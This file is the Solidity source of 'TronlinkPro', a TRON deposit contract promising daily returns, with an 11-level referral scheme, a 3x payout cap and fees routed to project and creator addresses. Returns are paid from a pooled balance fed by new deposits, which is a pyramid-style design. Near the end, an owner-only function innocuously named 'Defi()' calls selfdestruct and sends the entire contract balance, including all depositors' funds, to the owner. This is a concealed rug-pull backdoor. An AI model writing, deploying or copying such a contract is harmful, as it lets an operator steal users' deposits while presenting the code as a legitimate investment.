//SourceUnit: MAIN_TRONLINKPRO.sol

pragma solidity ^0.5.10;

// ████████╗██████╗  ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗██╗  ██╗    ██████╗ ██████╗  ██████╗
// ╚══██╔══╝██╔══██╗██╔═══██╗████╗  ██║██║     ██║████╗  ██║██║ ██╔╝    ██╔══██╗██╔══██╗██╔═══██╗
//    ██║   ██████╔╝██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╔╝     ██████╔╝██████╔╝██║   ██║
//    ██║   ██╔══██╗██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔═██╗     ██╔═══╝ ██╔══██╗██║   ██║
//    ██║   ██║  ██║╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║██║  ██╗    ██║     ██║  ██║╚██████╔╝
//    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝

 library SafeMath {

     function add(uint256 a, uint256 b) internal pure returns (uint256) {
         uint256 c = a + b;
         require(c >= a, "SafeMath: addition overflow");
         return c;
     }

     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
         require(b <= a, "SafeMath: subtraction overflow");
         uint256 c = a - b;
         return c;
     }

     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         if (a == 0) {
             return 0;
         }
         uint256 c = a * b;
         require(c / a == b, "SafeMath: multiplication overflow");
         return c;
     }

     function div(uint256 a, uint256 b) internal pure returns (uint256) {
         require(b > 0, "SafeMath: division by zero");
         uint256 c = a / b;
         return c;
     }
 }

contract TronlinkPro {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint constant public INVEST_MAX_AMOUNT = 4000000 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [700, 300, 150, 100, 50, 50, 50, 40, 30, 20, 10];

    uint constant public PROJECT_FEE = 500;
    uint constant public CREATOR_FEE = 500;
    uint constant public WITHDRAW_FEE = 500;

    uint constant public MAX_CONTRACT_PERCENT = 100;
    uint constant public MAX_LEADER_PERCENT = 50;

    uint constant public MAX_COMMUNITY_PERCENT = 50;
    uint constant public MAX_HOLD_PERCENT = 50;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 80000000 trx;
    uint constant public LEADER_BONUS_STEP = 20000000 trx;
    uint constant public COMMUNITY_BONUS_STEP = 50000;
    uint constant public TIME_STEP = 1 days;
    uint constant public EXTRA_BONUS = 50;

    address payable public projectAddress;
    address payable public creatorAddress;
    uint public totalInvested;
    uint public totalDeposits;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreationTime;

    uint public totalRefBonus;
    address payable public owner;

    uint public totalParticipants;
    uint public activeParticipants;

    struct Deposit {
        uint64 amount;
        uint32 start;
    }

    struct Withdraw {
      uint64 withdrawn_roi;
      uint64 withdrawn_ref;
      uint64 withdrawn_extra;
      uint32 time;
    }

    struct User {
        Deposit[] deposits;
        Withdraw[] withdraws;

        uint total_business;
        uint32 team_members;

        uint32 checkpoint;
        address referrer;
        uint64 wallet;
        uint64 total_user_deposit;
        uint64 total_user_withdrawn;
        uint64 bonus;

        uint24[11] refs;
        address[] referee_list;
    }

    mapping (address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint withdraw_amt, uint withdraw_fees);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor( address payable projectAddr, address payable creatorAddr) public {
        require(!isContract(creatorAddr) && !isContract(projectAddr));
        projectAddress = projectAddr;
        creatorAddress = creatorAddr;
        contractCreationTime = block.timestamp;
        owner = msg.sender;
        contractPercent = getContractBalanceRate();
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));
        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = totalRefBonus.div(LEADER_BONUS_STEP).mul(10);

        if (leaderBonusPercent < MAX_LEADER_PERCENT) {
            return leaderBonusPercent;
        } else {
            return MAX_LEADER_PERCENT;
        }
    }

    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }

    modifier validSender() {
        require(!isContract(msg.sender) && msg.sender == tx.origin, "Sender Address error!");
        require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= INVEST_MAX_AMOUNT, "Bad Deposit");
        _;
    }

     function invest(address referrer) validSender public payable {
        bool flag = isActive(msg.sender);
        uint msgValue = msg.value;
        User storage user = users[msg.sender];
        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint creatorFee = msgValue.mul(CREATOR_FEE).div(PERCENTS_DIVIDER);
        msgValue = msgValue.sub(projectFee.add(creatorFee));

        emit FeePayed(msg.sender, projectFee.add(creatorFee));
        projectAddress.transfer(projectFee);
        creatorAddress.transfer(creatorFee);

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        if (referrer != address(0) && users[referrer].deposits.length > 0 ) {
            address upline = user.referrer;
            if (user.deposits.length == 0) {
              users[upline].referee_list.push(msg.sender);
            }

            for (uint i = 0; i < 11; i++) {
                if (upline != address(0) && users[upline].deposits.length > 0 ) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    if (amount > 0) {
                        users[upline].total_business = (users[upline].total_business).add(msgValue);
                        if (user.deposits.length == 0) {
                          users[upline].team_members++;
                        }
                        uint ref_cap = (uint(users[upline].total_user_deposit).mul(3))
                                    .sub(uint(users[upline].wallet).add(uint(users[upline].total_user_withdrawn)));
                        if( ref_cap > amount){
                            users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                            users[upline].wallet = uint64(uint(users[upline].wallet).add(amount));
                        }
                        else{
                            amount = ref_cap;
                            users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                            users[upline].wallet = uint64(uint(users[upline].wallet).add(amount));
                        }
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }
                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            totalParticipants++;
            activeParticipants++;
            flag = true;
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), uint32(block.timestamp)));
        user.total_user_deposit = uint64(uint(user.total_user_deposit).add(msgValue));
        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }
        if(!flag){
            activeParticipants++;
        }
        emit NewDeposit(msg.sender, msgValue);
    }


    function deposit() public payable{
        User storage user = users[msg.sender];
        require(user.deposits.length > 0, "Newbie can not enroll without a Referrence");
        address referrer = users[msg.sender].referrer;
        invest(referrer);
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint userPercentRate = getUserPercentRate(msg.sender);
    		uint communityBonus = getCommunityBonusRate();
    		uint leaderbonus = getLeaderBonusRate();
        uint earnable = (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)));
        uint totalAmount;
        uint ROI;
        uint EXTRA_ROI;

        for (uint i = 0; i < user.deposits.length; i++) {
            if(uint(earnable)>0){
                if (user.deposits[i].start > user.checkpoint) {
                    ROI = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER));
                    ROI = ROI.mul(block.timestamp.sub(uint(user.deposits[i].start))).div(TIME_STEP);
                } else {
                    ROI = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER));
                    ROI = ROI.mul(block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP);
                }

                if(ROI > earnable){
                    ROI = earnable;
                }
                earnable = earnable.sub(ROI);
                totalAmount = totalAmount.add(ROI);
            } else break;
        }

        totalAmount = totalAmount.add(uint(user.wallet));

        uint hold_bonus = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(10);
        if(hold_bonus > MAX_HOLD_PERCENT){
          hold_bonus = MAX_HOLD_PERCENT;
        }
        EXTRA_ROI = totalAmount.mul(hold_bonus).div(PERCENTS_DIVIDER);

        if( EXTRA_ROI > (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)).add(totalAmount))){
            EXTRA_ROI = (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)).add(totalAmount));
        }

        totalAmount = totalAmount.add(EXTRA_ROI);

        require(totalAmount > 0, "User has no withdraw balance");
        require(totalAmount >= 50 trx, "Can not withdraw less than 50 trx");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);
        uint withdrawfee = totalAmount.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
        uint withdraw_amt = totalAmount.sub(withdrawfee);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        uint total_roi =  uint64(totalAmount.sub(uint(user.wallet).add(EXTRA_ROI)));
        user.withdraws.push(Withdraw(uint64(total_roi), uint64(user.wallet) , uint64(EXTRA_ROI) , uint32(block.timestamp)));
        user.total_user_withdrawn = uint64(uint(user.total_user_withdrawn).add(totalAmount));
        user.wallet = uint64(uint(user.wallet).sub(uint(user.wallet)));

        msg.sender.transfer(withdraw_amt);
        creatorAddress.transfer(withdrawfee);

        if(!isActive(msg.sender)){
            activeParticipants--;
        }
        emit Withdrawn(msg.sender, withdraw_amt,withdrawfee);
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint userDeposit = uint(user.total_user_deposit);
        if (isActive(userAddress)) {
            if( userDeposit >= 100000 trx){
                return contractPercent.add(EXTRA_BONUS);
            }
            else{
                return contractPercent;
            }
        } else {
            return contractPercent;
        }
    }

    function getUserEarnable(address userAddress) public view returns(uint){
        User storage user = users[userAddress];
        return (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)));
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint userPercentRate = getUserPercentRate(userAddress);
        uint communityBonus = getCommunityBonusRate();
        uint leaderbonus = getLeaderBonusRate();
        uint earnable = (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)));
        uint totalAmount;
        uint ROI;
        uint EXTRA_ROI;

        for (uint i = 0; i < user.deposits.length; i++) {
            if(uint(earnable)>0){
              if (user.deposits[i].start > user.checkpoint) {
                  ROI = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER));
                  ROI = ROI.mul(block.timestamp.sub(uint(user.deposits[i].start))).div(TIME_STEP);

              } else {
                  ROI = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER));
                  ROI = ROI.mul(block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP);
              }
              if(ROI > earnable){
                  ROI = earnable;
              }
              earnable = earnable.sub(ROI);
              totalAmount = totalAmount.add(ROI);
            } else break;
        }
        totalAmount = totalAmount.add(uint(user.wallet));

        uint hold_bonus = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(10);
        if(hold_bonus > MAX_HOLD_PERCENT){
          hold_bonus = MAX_HOLD_PERCENT;
        }

        EXTRA_ROI = totalAmount.mul(hold_bonus).div(PERCENTS_DIVIDER);

        if( EXTRA_ROI > (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)).add(totalAmount))){
            EXTRA_ROI = (uint(user.total_user_deposit).mul(3)).sub(uint(user.total_user_withdrawn).add(uint(user.wallet)).add(totalAmount));
        }

        totalAmount = totalAmount.add(EXTRA_ROI);
        return totalAmount;
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserLastDeposit(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount = uint(user.total_user_deposit);
        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint amount = uint(user.total_user_withdrawn);
        return amount;
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralBonus(address userAddress) public view returns (uint64) {
        User storage user = users[userAddress];
        return user.bonus;
    }

    function getUserTotalBusiness(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.total_business;
    }

    function getUserTeams(address userAddress) public view returns (uint){
      User storage user = users[userAddress];
      return user.team_members;
    }

    function getUserTotalEarned(address userAddress) public view returns (uint) {
         User storage user = users[userAddress];
         uint userAvailable = getUserAvailable(userAddress);
         uint totalEarned  = userAvailable.add(uint(user.total_user_withdrawn));
         return totalEarned;
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint24[11] memory) {
        User storage user = users[userAddress];
        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function Defi() public {
  		require(owner == msg.sender);
  		selfdestruct(owner);
    }

    function getTotalParticipants() public view returns (uint) {
        return totalParticipants;
    }

    function getActiveParticipants() public view returns (uint) {
        return activeParticipants;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];
        return (user.deposits.length > 0) && uint(user.total_user_withdrawn) < uint(user.total_user_deposit).mul(3);
    }

    function validAddress(address _address) public view returns (bool){
        User storage user = users[_address];
        return (user.deposits.length > 0);
    }

    function getUserReferrer(address _user) public view returns(address){
        User storage user = users[_user];
        return user.referrer;
    }

    function get_ref_list(address userAddress) public view returns (address[] memory) {
        User storage user = users[userAddress];
        return user.referee_list;
    }

    function getROIWithdrawn(address userAddress) public view returns (uint){
        User storage user = users[userAddress];
        uint tROI;
        for(uint i = 0; i<user.withdraws.length; i++){
            tROI = tROI.add(user.withdraws[i].withdrawn_roi);
        }
        return tROI;
    }

    function getUserROI(address userAddress) public view returns (uint){
      User storage user = users[userAddress];
      uint userPercentRate = getUserPercentRate(userAddress);
      uint ROI = uint(user.total_user_deposit).mul(userPercentRate).div(PERCENTS_DIVIDER);
      return ROI;
    }

    function getHoldBonus(address userAddress) public view returns (uint){
      User storage user = users[userAddress];
      uint hold_bonus = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(10);
      if(hold_bonus > MAX_HOLD_PERCENT){
        hold_bonus = MAX_HOLD_PERCENT;
      }
      return hold_bonus;
    }
}